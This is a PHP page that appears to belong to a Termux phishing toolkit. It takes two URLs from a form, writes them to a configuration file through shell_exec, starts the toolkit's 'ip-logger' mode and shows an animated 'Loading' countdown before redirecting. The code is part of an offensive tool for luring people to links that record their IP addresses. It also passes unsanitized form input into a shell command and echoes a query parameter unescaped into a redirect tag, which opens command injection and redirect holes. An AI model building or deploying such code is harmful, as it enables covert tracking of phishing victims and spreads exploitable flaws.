<?php
$ngrok = file_exists("/data/data/com.termux/files/usr/bin/ngrok");
$control = "/data/data/com.termux/files/usr/bin/ngrok";
if ($ngrok != $control){
	header("Location: /phishing-tools/phishing_files/error.php");
}

// İP LOGGER //

if (isset($_POST['url_1']) && isset($_POST['url_2'])) {
	$url_1 = $_POST['url_1'];
	$url_2 = $_POST['url_2'];
	$location = '/data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/ip-logger/interface';
	$location_file = '/data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/ip-logger/interface/refresh_url';
	shell_exec("echo -e \"$url_1\n$url_2\" > $location_file ");
	shell_exec("echo 'ip-logger' > $location/_command");}


/*  END  */

?>
<!DOCTYPE html>
<html translate="no">
    <head>
<?php
if (isset($_GET['refresh'])){
	if (empty($url_2)){
		$url_2 = ""; }
	$refresh = "$_GET[refresh]?url=$url_2";
}else{
	$refresh = '/phishing-tools/phishing_files/links-page.php';
}
echo "<meta http-equiv='refresh' content='11;url=$refresh'/>";
?>
<title>Loading</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@500&display=swap');
body{
  margin: 0;
  padding: 0;
  font-family: Quicksan;
  background: black;
  box-sizing: border-box;
}

h1{
  font-size:150px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%);
  margin: 0;
  padding: 0;
  text-transform: uppercase;
  letter-spacing: 10px;
  color:white;

}

h1:before{
  content: attr(data-text);
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  color: #ADFF2F;
  overflow: hidden;
  animation: animate 7s linear infinite;
  border-right: 4px solid #ADFF2F;
  
}


.green-neon {
   text-shadow: 6px 6px 3px rgba(0,0,0,.4),
    0 0 20px #03e9f4;,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}
.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}
@keyframes animate{

  0%{
    width: 0;
  }
  50%{
    width: 99%;
  }
  100%{
    width: 0;
  }
}
:root {
  --transition-speed: 0.5s;
  --background-color: #0e1538;
  --bright-background: #fff;
  --text-color: #fff;
  --font: sans-serif;
  --border-radius: 0.5rem;
}

* {
  margin: 0;
  padding: 0;
}

body {
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: var(--background-color);
  font-family: var(--font);
}

.card {
top: 300px;
  background-color: white;
  width: 200px;
  height: 275px;
  position: relative;
  user-select: none;
  cursor: cursor;
  transition: var(--transition-speed) ease-in-out;
}

.card::before {
  content: "";
  position: absolute;
  top: -4px;
  left: -4px;
  bottom: -4px;
  right: -4px;
  transform: skew(2deg, 4deg);
  background: linear-gradient(315deg, #00ccff, #0e1538, #d400d4);
}
.card::after {
  content: "";
  position: absolute;
  top: -4px;
  left: -4px;
  bottom: -4px;
  right: -4px;
  transform: skew(2deg, 4deg);

  background: linear-gradient(315deg, #00ccff, #0e1538, #d400d4);
}

.card .num {
  width: 100%;
  height: 100%;

  position: absolute;
  z-index: 10;
  background-color: var(--background-color);
  color: var(--text-color);
}

.card .num h2 {
  font-size: 8em;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
}

.card:hover {
  transform: scale(1.1);
  box-shadow: 0 0 200px rgba(225, 225, 225, 0.3);
  transform: rotate(720deg);
}
.underline{
  position: absolute;
  top: 90%;
  left: 58%;
  transform: translate(-60%,-60%);
  left: 175px;
  width: 900px;
  border: 5px solid #03e9f4;;
  border-radius: 15px;
  color: #03e9f4;
}

</style>
    </head>
    <body>
	    <div>
<div class="card">
  <div class="num">
    <h2 class="val"></h2>
  </div>
</div>
	    <h1 data-text="Loading...">Loading...</h1>
	    <div class="underline green-neon">-</div>
	    </div>
<script>
var val = document.querySelector(".val");
let i = 11;
var cancel = setInterval(() => {
  if (i <= 1) {
    clearInterval(cancel);
  }
  val.innerHTML = `${--i}`;
}, 1000);
</script>
    </body>
</html>
